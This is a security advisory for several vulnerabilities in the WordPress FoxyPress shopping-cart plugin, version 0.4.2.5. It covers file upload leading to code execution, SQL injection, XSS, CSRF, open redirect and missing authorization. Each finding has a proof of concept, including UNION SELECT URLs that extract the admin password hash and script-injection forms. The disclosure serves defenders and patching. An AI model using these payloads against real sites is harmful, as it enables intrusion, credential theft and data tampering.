@@ -1,0 +1,955 @@
+[waraxe-2012-SA#095] - Multiple Vulnerabilities in Wordpress FoxyPress Plugin
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 30. October 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-95.html
+
+
+Description of vulnerable target:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+FoxyPress is a FREE shopping cart and product management tool that integrates
+with FoxyCart's e-commerce solution to help you get your store up and running
+quickly and efficiently. 
+
+http://wordpress.org/extend/plugins/foxypress/
+
+Affected version: 0.4.2.5
+
+
+
+###############################################################################
+1. Arbitrary File Upload Vulnerability in "documenthandler.php"
+###############################################################################
+
+Reasons: Missing security checks in file upload functionality
+Attack vectors: Uploaded file
+Preconditions: Logged in as admin with FoxyPress product editing privileges
+ 
+
+Php script "documenthandler.php" line 14:
+------------------------[ source code start ]----------------------------------
+if (!empty($_FILES)) {
+...
+ $targetpath = ABSPATH . INVENTORY_DOWNLOADABLE_LOCAL_DIR;
+...
+ $newfilename = foxypress_GenerateNewFileName($fileExtension, $inventory_id,
+   $targetpath, $prefix);    
+ $targetpath = $targetpath . $newfilename;     
+ if(move_uploaded_file($_FILES['Filedata']['tmp_name'], $targetpath))
+------------------------[ source code end ]------------------------------------
+
+As we can see above, there is no security checks against uploaded file. As
+result, attacker is able to upload files with arbitrary extension to remote
+system. In case of php files this vulnerability leads to RCE (Remote Code
+Execution).
+
+Test:
+
+1. Open product editing webpage:
+
+http://localhost/wp342/wp-admin/post.php?post=43&action=edit
+
+2. Look for "Digital Downloads". Insert some number to the input box below:
+"Max Downloads allowed (if you need to override the main setting)".
+
+3. There must be "Browse Files" button (Flash-based). Choose the php file, you
+want to upload.
+
+We can observe AJAX in action and as result download link appears:
+
+http://localhost/wp342/wp-content/inventory_downloadables/my_download_jw82ku0jz9_43.php
+
+Opening that download link will execute previously uploaded php file.
+
+
+
+###############################################################################
+2. SQL Injection Vulnerability in "documenthandler.php"
+###############################################################################
+
+Reasons: Insufficient sanitization of user-supplied data
+Attack vectors: User-supplied POST parameter "prefix"
+Preconditions: Logged in as admin with FoxyPress product editing privileges
+ 
+
+Php script "documenthandler.php" line 14:
+------------------------[ source code start ]----------------------------------
+if (!empty($_FILES)) {
+    $inventory_id = intval( $_POST['inventory_id'] );
+    $downloadabletable = $_POST['prefix'];
+...
+ $query = "INSERT INTO " . $downloadabletable . " SET inventory_id='" 
+  . $inventory_id . "', filename='" . mysql_escape_string($newfilename)
+  . "',  maxdownloads= '" . mysql_escape_string($downloadablemaxdownloads)
+  . "', status = 1";
+ $wpdb->query($query);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied POST parameter "prefix" in used in subsequent
+SQL "INSERT INTO" query as table name. There is no input data sanitization,
+therefore attacker is able to insert any data to any tables in current database.
+
+
+Test (parameter "security" must be valid):
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/admin-ajax.php?action=foxypress_download&security=844b64ce45" method="post" enctype="multipart/form-data">
+<input type="file" name="Filedata">
+<input type="hidden" name="downloadablemaxdownloads" value="1">
+<input type="hidden" name="prefix" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Table 'wp342.waraxe' doesn't exist]
+INSERT INTO waraxe SET inventory_id='0', filename='downloadable_qga73aojs8_0.php', maxdownloads= '1', status = 1
+
+
+
+###############################################################################
+3. SQL Injection Vulnerability in "foxypress-manage-emails.php"
+###############################################################################
+
+Reasons: Insufficient sanitization of user-supplied data
+Attack vectors: User-supplied GET parameter "id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+ 
+
+Php script "foxypress-manage-emails.php" line 14:
+------------------------[ source code start ]----------------------------------
+function foxypress_manage_emails_page_load() 
+{
+ global $wpdb;
+    
+ if(isset($_GET['mode']) && $_GET['mode']=='edit')
+ {
+  if(isset($_POST['foxy_em_save']))
+  {
+...
+   $sql = "UPDATE  ". $wpdb->prefix . "foxypress_email_templates set 
+     foxy_email_template_name='".$templatename."', 
+     foxy_email_template_subject='".$subject."', 
+     foxy_email_template_email_body='".$content."', 
+     foxy_email_template_from='" . $from . "' 
+     WHERE email_template_id=".$_GET[id];
+------------------------[ source code end ]------------------------------------
+
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&mode=edit&id=waraxe" method="post">
+<input type="hidden" name="foxy_em_save" value="1">
+<input type="hidden" name="templatename" value="2">
+<input type="hidden" name="subject" value="3">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+UPDATE wp_foxypress_email_templates set foxy_email_template_name='2',
+foxy_email_template_subject='3', foxy_email_template_email_body='',
+foxy_email_template_from='' WHERE email_template_id=waraxe
+
+
+
+###############################################################################
+4. SQL Injection Vulnerabilities in "inventory-category.php"
+###############################################################################
+
+Reasons: Insufficient sanitization of user-supplied data
+Attack vectors:
+ 1. case: User-supplied POST parameter "foxy_cat_id"
+ 2. case: User-supplied GET parameter "category_id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+***************
+--> Case 1 <-- 
+***************
+
+Php script "inventory-category.php" line 28:
+------------------------[ source code start ]----------------------------------
+else if(isset($_POST['foxy_cat_save'])) //updating
+{
+ $Category_Name = foxypress_FixPostVar('foxy_cat_name');
+ $Category_ID = foxypress_FixPostVar('foxy_cat_id');
+ $sql = "UPDATE " . $wpdb->prefix . "foxypress_inventory_categories SET
+     category_name='" . $Category_Name . "' WHERE category_id=" . $Category_ID;
+ $wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category" method="post">
+<input type="hidden" name="foxy_cat_save" value="1">
+<input type="hidden" name="foxy_cat_name" value="1">
+<input type="hidden" name="foxy_cat_id" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+UPDATE wp_foxypress_inventory_categories SET category_name='1' WHERE category_id=waraxe
+
+
+***************
+--> Case 2 <-- 
+***************
+
+Php script "inventory-category.php" line 36:
+------------------------[ source code start ]----------------------------------
+else if($mode == "delete" &&  foxypress_FixGetVar('category_id') != "") //deleting
+{
+ $category_id = foxypress_FixGetVar('category_id');
+...
+  //delete from categories
+  $sql = "DELETE FROM " . $wpdb->prefix . "foxypress_inventory_categories WHERE category_id=" . $category_id;
+  $wpdb->query($sql);
+
+  //delete  from inventory to categories
+  $sql = "DELETE FROM " . $wpdb->prefix . "foxypress_inventory_to_category WHERE category_id=" . $category_id;
+  $wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete&category_id=waraxe
+
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_foxypress_inventory_categories WHERE category_id=waraxe
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+DELETE FROM wp_foxypress_inventory_to_category WHERE category_id=waraxe
+
+
+
+###############################################################################
+5. SQL Injection Vulnerabilities in "affiliate-management.php"
+###############################################################################
+
+Reasons: Insufficient sanitization of user-supplied data
+Attack vectors:
+ 1. case: User-supplied GET parameter "order"
+ 2. case: User-supplied GET parameter "banner_id"
+ 3. case: User-supplied GET parameter "affiliate_id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+ 
+***************
+--> Case 1 <-- 
+***************
+
+Php script "affiliate-management.php" line 1060:
+------------------------[ source code start ]----------------------------------
+function foxypress_create_affiliate_table() {
+...
+ $banner_order_by     = $fp_banner->foxypress_FixGetVar('orderby');
+ $banner_order        = $fp_banner->foxypress_FixGetVar('order');
+...
+ $fp_banner->prepare_items($banner_order_by, $banner_order); 
+...
+function prepare_items($order_by = '', $order = '')
+{
+...
+ if (!$order) {
+  $sort_order = 'ASC';
+ } else {
+  $sort_order = strtoupper($order);
+ }
+ 
+ if ($order_by === 'management_asset_name')
+ {
+  $sort_by = 'foxy_asset_name ' . $sort_order;
+ }
+...
+ $sql_data = "SELECT *
+   FROM " . $wpdb->base_prefix . "foxypress_affiliate_assets
+   ORDER BY " . $sort_by;
+
+ $data = $wpdb->get_results($sql_data);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&orderby=management_asset_name&order=waraxe
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [You have an error in your SQL syntax; check the 
+manual that corresponds to your MySQL server version for the right syntax to
+use near 'WARAXE' at line 3]
+SELECT * FROM wp_foxypress_affiliate_assets ORDER BY foxy_asset_name WARAXE
+
+
+***************
+--> Case 2 <-- 
+***************
+
+Php script "affiliate-management.php" line 217:
+------------------------[ source code start ]----------------------------------
+function get_affiliate_banner()
+{
+ global $wpdb;
+ $banner_id = $this->foxypress_FixGetVar('banner_id');
+ 
+ $data = "SELECT *
+          FROM " . $wpdb->prefix . "foxypress_affiliate_assets
+          WHERE id = " . $banner_id;
+ 
+ return $wpdb->get_results($data);
+}
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_banner&banner_id=waraxe
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT * FROM wp_foxypress_affiliate_assets WHERE id = waraxe
+
+Test (fetching admin credentials from database, table prefix must be valid):
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_banner&banner_id=0+UNION+SELECT+1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1,1
+
+
+***************
+--> Case 3 <-- 
+***************
+
+Php script "affiliate-management.php" line 951:
+------------------------[ source code start ]----------------------------------
+$affiliate_id = $this->foxypress_FixGetVar('affiliate_id');
+
+$sql_data = "SELECT *
+             FROM " . $wpdb->prefix . "foxypress_affiliate_payments
+             WHERE foxy_affiliate_id = " . $affiliate_id . " 
+             ORDER BY " . $sort_by;
+...
+$data = $wpdb->get_results($sql_data);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_past_details&affiliate_id=waraxe
+
+Result (Wordpress must be set to show SQL errors):
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+SELECT * FROM wp_foxypress_affiliate_payments 
+WHERE foxy_affiliate_id = waraxe ORDER BY foxy_transaction_id DESC
+
+Test (fetching admin credentials from database, table prefix must be valid):
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_past_details&affiliate_id=0+UNION+SELECT+1,1,1,1,1,1,1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1
+
+
+
+###############################################################################
+6. Reflected XSS Vulnerability in "reports.php"
+###############################################################################
+
+Reasons: Improper encoding or escaping of output
+Attack vectors: User-supplied POST parameters "txtStartDate", "txtEndDate", "txtProductCode"
+Preconditions: Logged in as admin with FoxyPress management privileges
+ 
+
+Php script "reports.php" line 68:
+------------------------[ source code start ]----------------------------------
+if(isset($_POST['txtStartDate'])){$txtStartDate = $_POST['txtStartDate'];}else{$txtStartDate = "";}
+if(isset($_POST['txtEndDate'])){$txtEndDate = $_POST['txtEndDate'];}else{$txtEndDate = "";}
+    
+if(isset($_POST['txtProductCode'])){$txtProductCode = $_POST['txtProductCode'];}else{$txtProductCode = "";}
+...
+<input type="text" id="txtStartDate" name="txtStartDate" value="
+  <?php echo(($txtStartDate != "") ? $txtStartDate : date("Y-m-d"))  ?>" />
+...
+<input type="text" id="txtEndDate" name="txtEndDate"  value="
+  <?php echo(($txtEndDate != "") ? $txtEndDate : date("Y-m-d")); ?>" />
+...
+<td><input id="txtProductCode" name="txtProductCode" type="text" value="
+  <?php echo($txtProductCode);?>" /></td>
+------------------------[ source code end ]------------------------------------
+
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=reports&report=2" method="post">
+<input type="hidden" name="txtStartDate" value='"><script>alert(123)</script>'>
+<input type="hidden" name="txtEndDate" value='"><script>alert(223)</script>'>
+<input type="hidden" name="txtProductCode" value='"><script>alert(323)</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+
+###############################################################################
+7. Reflected XSS Vulnerability in "foxypress-manage-emails.php"
+###############################################################################
+
+Reasons: Improper encoding or escaping of output
+Attack vectors: User-supplied GET parameter "id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "foxypress-manage-emails.php" line 42:
+------------------------[ source code start ]----------------------------------
+<td width="180"><?php _e('Template ID', 'foxypress'); ?></td><td><?php _e($_GET['id']); ?></td>
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&mode=edit&id=<body+onload=alert(123);>
+
+
+
+###############################################################################
+8. Reflected XSS Vulnerability in "foxypress-affiliate.php"
+###############################################################################
+
+Reasons: Improper encoding or escaping of output
+Attack vectors: User-supplied GET parameter "aff_id"
+Preconditions: Logged in as Wordpress user
+
+
+Php script "foxypress-affiliate.php" line 16:
+------------------------[ source code start ]----------------------------------
+$affiliate_id = $_GET['aff_id'];
+...
+$_SESSION['affiliate_id'] = $affiliate_id;
+------------------------[ source code end ]------------------------------------
+
+Php script "affiliate-signup.php" line 140:
+------------------------[ source code start ]----------------------------------
+<input type="hidden" name="affiliate_referred_by_id" id="affiliate_referred_by_id"
+   value="<?php echo $_SESSION['affiliate_id']; ?>">
+------------------------[ source code end ]------------------------------------
+
+
+Test (two-step XSS):
+
+1. Log in as Wordpress user who is not yet registered affiliate
+
+2. open URL below:
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-affiliate.php?aff_id="><script>alert(123);</script>
+
+3. open affiliate signup page:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-signup
+
+Result: we can observe XSS payload execution
+
+
+
+###############################################################################
+9. Reflected XSS Vulnerability in "order-management.php"
+###############################################################################
+
+Reasons: Improper encoding or escaping of output
+Attack vectors: User-supplied GET parameter "status"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "order-management.php" line 173:
+------------------------[ source code start ]----------------------------------
+$List_Status = foxypress_FixGetVar("status", "");
+...
+$basePage =  $Page_URL . "?post_type=" . FOXYPRESS_CUSTOM_POST_TYPE . 
+    "&page=order-management&status=" . $List_Status . "&mode=list";
+...
+<option value=\"" . $basePage  . "\"" . (($Transaction_Type == "") ? 
+  "selected='selected'" : "") . ">" . __('All Transactions', 
+  'foxypress') . "</option>
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=order-management&status="></option></select><script>alert(123);</script>
+
+
+
+###############################################################################
+10. Reflected XSS Vulnerability in "affiliate-management.php"
+###############################################################################
+
+Reasons: Improper encoding or escaping of output
+Attack vectors: User-supplied POST parameter "page"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "affiliate-management.php" line 1125:
+------------------------[ source code start ]----------------------------------
+<input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>" />
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management" method="post">
+<input type="hidden" name="page" value='"><script>alert(123);</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+
+###############################################################################
+11. Open Redirect Vulnerability in "foxypress-affiliate.php"
+###############################################################################
+
+Reasons: Insufficient sanitization of user-supplied data
+Attack vectors: User-supplied GET parameter "url"
+Preconditions: none
+Results: allows remote attackers to redirect users to arbitrary web sites and
+ conduct phishing attacks
+
+ 
+Php script "foxypress-affiliate.php" line 17:
+------------------------[ source code start ]----------------------------------
+if (isset($_GET['url'])) {
+    $destination_url = $_GET['url'];
+...
+header('Location: ' . $destination_url);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-affiliate.php?url=http://php.net/
+
+
+
+###############################################################################
+12. Information Leakage Vulnerability via directly accessible CSV files
+###############################################################################
+
+Foxypress is using three different CSV files - "Inventory.csv", "Export.csv"
+and "Coupons.csv" as containers for temporal data. These three files are directly
+accessible and can be downloaded without any restrictions. As result attacker
+may obtain potentially sensitive information.
+
+
+Php script "import-export.php" line 34:
+------------------------[ source code start ]----------------------------------
+if (move_uploaded_file($_FILES['file_import']['tmp_name'],
+    WP_PLUGIN_DIR . '/foxypress/Inventory.csv'))
+...
+  $f = fopen(WP_PLUGIN_DIR . "/foxypress/Export.csv", "x+");
+...
+    fputcsv($f, $line );
+    fseek($f, -1, SEEK_CUR);
+    fwrite($f, "\r\n"); 
+------------------------[ source code end ]------------------------------------
+
+Php script "reports.php" line 557:
+------------------------[ source code start ]----------------------------------
+$f = fopen(WP_PLUGIN_DIR . "/foxypress/Coupons.csv", "x+");
+...
+    fputcsv($f, $line);
+    fseek($f, -1, SEEK_CUR);
+    fwrite($f, "\r\n"); 
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/foxypress/Coupons.csv
+
+http://localhost/wp342/wp-content/plugins/foxypress/Export.csv
+
+http://localhost/wp342/wp-content/plugins/foxypress/Inventory.csv
+
+
+
+###############################################################################
+13. CSRF Vulnerability in "affiliate-management.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "mode" and "banner_id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "affiliate-management.php" line 1348:
+------------------------[ source code start ]----------------------------------
+<?php } else if ($mode === 'delete_banner') { 
+ global $wpdb;
+ $banner_id = $fp_banner->foxypress_FixGetVar('banner_id');
+ $sql = "DELETE FROM " . $wpdb->prefix . "foxypress_affiliate_assets
+         WHERE ID = '" . $banner_id . "'";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=delete_banner&banner_id=123
+
+Result: "Banner Deleted!"
+
+
+
+###############################################################################
+14. CSRF Vulnerabilities in "inventory-category.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "mode" and "category_id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "inventory-category.php" line 36:
+------------------------[ source code start ]----------------------------------
+else if($mode == "delete" &&  foxypress_FixGetVar('category_id') != "") //deleting
+{
+  $category_id = foxypress_FixGetVar('category_id');
+ ...
+  //delete from categories
+  $sql = "DELETE FROM " . $wpdb->prefix . "foxypress_inventory_categories 
+          WHERE category_id=" . $category_id;
+  $wpdb->query($sql);
+
+  //delete  from inventory to categories
+  $sql = "DELETE FROM " . $wpdb->prefix . "foxypress_inventory_to_category
+          WHERE category_id=" . $category_id;
+  $wpdb->query($sql);
+...
+else if($mode == "delete_image" && foxypress_FixGetVar('category_id') != "")
+{
+ $category_id = foxypress_FixGetVar('category_id');
+...
+ foxypress_DeleteItem($directory . $data->category_image);
+ $wpdb->query("UPDATE " . $wpdb->prefix . "foxypress_inventory_categories SET
+  category_image = NULL where category_id =
+  '" . mysql_escape_string($category_id) . "'");
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete&category_id=123
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete_image&category_id=123
+
+
+
+###############################################################################
+15. CSRF Vulnerability in "inventory-option-groups.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "action" and "optiongroupid"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "inventory-option-groups.php" line 15:
+------------------------[ source code start ]----------------------------------
+$action = foxypress_FixGetVar("action");
+...
+else if($action == "deleteoptiongroup")
+{
+  $option_group_id = foxypress_FixGetVar('optiongroupid', '');
+  if($option_group_id != "")
+  {
+    //delete option group
+    $wpdb->query("delete from " . $wpdb->prefix . "foxypress_inventory_option_group"
+                 . " where option_group_id = '" . $option_group_id . "'");
+    //delete options related to option group
+    $wpdb->query("delete from " . $wpdb->prefix . "foxypress_inventory_options"
+                 . " where option_group_id = '" . $option_group_id . "'");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-option-groups&action=deleteoptiongroup&optiongroupid=123
+
+
+
+###############################################################################
+16. CSRF Vulnerability in "status-management.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "action" and "status"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "status-management.php" line 18:
+------------------------[ source code start ]----------------------------------
+$StatusID = foxypress_FixGetVar("status", "");
+$Action = foxypress_FixGetVar("action", "");
+...
+if($Action == "delete" && $StatusID != "" && $StatusID != "1")
+{
+  //delete status
+  $sql = "delete from  " . $wpdb->prefix . "foxypress_transaction_status 
+          WHERE foxy_transaction_status = '$StatusID'";
+  $wpdb->query($sql);
+  //update transactions in limbo to unprocessed
+  $sql = "update " . $wpdb->prefix ."foxypress_transaction SET 
+    foxy_transaction_status = '1' WHERE foxy_transaction_status = '$StatusID'";
+  $wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=status-management&action=delete&status=123
+
+
+
+###############################################################################
+17. CSRF Vulnerability in "order-management.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "action" and "note"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "order-management.php" line 19:
+------------------------[ source code start ]----------------------------------
+$Page_Action = foxypress_FixGetVar("action", "");
+...
+else if($Page_Action == "deletenote" && foxypress_FixGetVar("note", "") != "")
+{
+...
+  $NoteID = foxypress_FixGetVar("note", "");
+  $sql = "delete from  " . $wpdb->prefix . "foxypress_transaction_note 
+          WHERE foxy_transaction_id = '$TransactionID' and 
+          foxy_transaction_note_id='$NoteID'";
+  $wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=order-management&action=deletenote&note=123
+
+
+
+###############################################################################
+18. CSRF Vulnerability in "foxypress-manage-emails.php"
+###############################################################################
+
+Reasons: 
+ 1. Using GET method for non-idempotent operations
+ 2. Missing anti-CSRF measures (for example "check_admin_referer()")
+Attack vectors: User-supplied GET parameters "action" and "id"
+Preconditions: Logged in as admin with FoxyPress management privileges
+
+
+Php script "foxypress-manage-emails.php" line 450:
+------------------------[ source code start ]----------------------------------
+$action = foxypress_FixGetVar('action');
+if ($action === 'updated') { 
+...
+}else if ($action === 'delete') { 
+  sql = "delete from  " . $wpdb->prefix . "foxypress_email_templates
+         WHERE email_template_id = '".$_GET['id']."'";
+  $wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&action=delete&id=123
+
+Result: "Your email template has been successfully deleted!"
+
+
+
+###############################################################################
+19. Unauthorized Access Vulnerability in "ajax.php"
+###############################################################################
+
+Reasons: missing authorization
+Preconditions: none
+
+
+Php script "ajax.php" line 7:
+------------------------[ source code start ]----------------------------------
+session_start();
+...
+$mode = foxypress_FixGetVar('m');
+header('Content-type: application/json');     
+if($mode == "tracking")
+{
+  //tracking vars
+  $lastname = foxypress_FixGetVar('ln');
+  $id = foxypress_FixGetVar('id');    
+...
+  //search table for tracking number
+  $item = $wpdb->get_row("SELECT t.*, s.foxy_transaction_status_description
+    FROM " .  $wpdb->prefix . "foxypress_transaction as t
+    INNER JOIN " . $wpdb->prefix . "foxypress_transaction_status as s on 
+        t.foxy_transaction_status = s.foxy_transaction_status
+    WHERE t.foxy_transaction_id = '" . $id . "'
+    and LOWER(t.foxy_transaction_last_name) = LOWER('" . $lastname . "')");
+...
+else if($mode == "deletedownloadable")
+{
+...
+ $session_id = foxypress_FixGetVar('sid');
+ $downloadable_id = foxypress_FixGetVar('downloadableid');
+...    
+ if($session_id == session_id())
+ {
+...
+   $query = "UPDATE ". $wpdb->prefix  . "foxypress_inventory_downloadables SET
+        status = '0' 
+        WHERE downloadable_id='" . mysql_escape_string($downloadable_id) . "'";        
+   $wpdb->query($query);    
+...
+else if($mode == "savemaxdownloads")
+...
+else if($mode == "resetdownloadcount")
+...
+else if($mode == "save-image-order")
+...
+else if($mode == "transaction_submit")
+...
+//save transaction status
+$sql = "update " . $wpdb->prefix ."foxypress_transaction SET 
+       foxy_transaction_status = '$NewStatus', 
+       foxy_transaction_trackingnumber = '$TrackingNumber',
+       foxy_transaction_rmanumber = '$RMANumber' 
+       WHERE foxy_transaction_id = '$TransactionID'";
+$wpdb->query($sql);
+------------------------[ source code end ]------------------------------------
+
+Php script "ajax.php" can handle six different operations: "tracking",
+"deletedownloadable", "savemaxdownloads", "resetdownloadcount",
+"save-image-order" and "transaction_submit". There is no authorization checks
+at all, so anyone can use this script, no valid session required.
+
+This security vulnerability may lead to information leakage and data tampering.
+
+1. operation "tracking": if attacker can guess transaction ID and subject's last
+name, then it is possible to obtain shipping address, transaction status and
+tracking number. Transaction ID is integer and can be bruteforced.
+
+Test (transaction ID "id" and last name "ln" must be valid):
+
+http://localhost/wp342/wp-content/plugins/foxypress/ajax.php?m=tracking&id=123&ln=doe
+
+
+2. operations "deletedownloadable", "savemaxdownloads", "resetdownloadcount"
+allows unauthorized attacker to manipulate with digital downloads settings.
+There is a check for valid php session ID, so attack will be 2-step.
+
+Test:
+
+First, let's open "ajax.php" webpage, so that php session is created:
+
+http://localhost/wp342/wp-content/plugins/foxypress/ajax.php
+
+Php session ID can be found from cookies:
+
+PHPSESSID=1jnd2u36vmvesa33jcsappmbs2
+
+Next, let's issue GET request with found session ID:
+
+localhost/wp342/wp-content/plugins/foxypress/ajax.php?m=deletedownloadable&sid=1jnd2u36vmvesa33jcsappmbs2&inventoryid=foobar&downloadableid=2
+
+Result: {"ajax_status":"ok"}
+
+In this way unauthorized attacker can delete (disable) any digital downloads.
+
+
+3. operation "save-image-order" allows unauthorized attacker to change menu
+ordering and has minor effect.
+
+
+4. operation "transaction_submit" allows unauthorized attacker to change 
+transaction status, tracking number and RMA number, if transaction ID is known.
+Transaction ID is integer and can be bruteforced.
+
+
+
+###############################################################################
+20. Full Path Disclosure Vulnerability in multiple scripts
+###############################################################################
+
+Reasons: Direct request to php script triggers pathname leak in error message
+Preconditions: PHP directive "display_errors=on"
+Result: Information Exposure Through an Error Message
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/foxypress/custom-post-type.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\custom-post-type.php on line 9
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-manage-emails.php
+
+Fatal error: Call to undefined function load_plugin_textdomain() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\foxypress-manage-emails.php on line 9
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-redirect.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\foxypress-redirect.php on line 8
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-settings.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\foxypress-settings.php on line 8
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress-templates.php
+
+Fatal error: Call to undefined function load_plugin_textdomain() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\foxypress-templates.php on line 9
+
+http://localhost/wp342/wp-content/plugins/foxypress/foxypress.php
+
+Fatal error: Call to undefined function register_activation_hook() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\foxypress.php on line 46
+
+http://localhost/wp342/wp-content/plugins/foxypress/import-export.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\foxypress\import-export.php on line 8
+
+
+
+Contact:
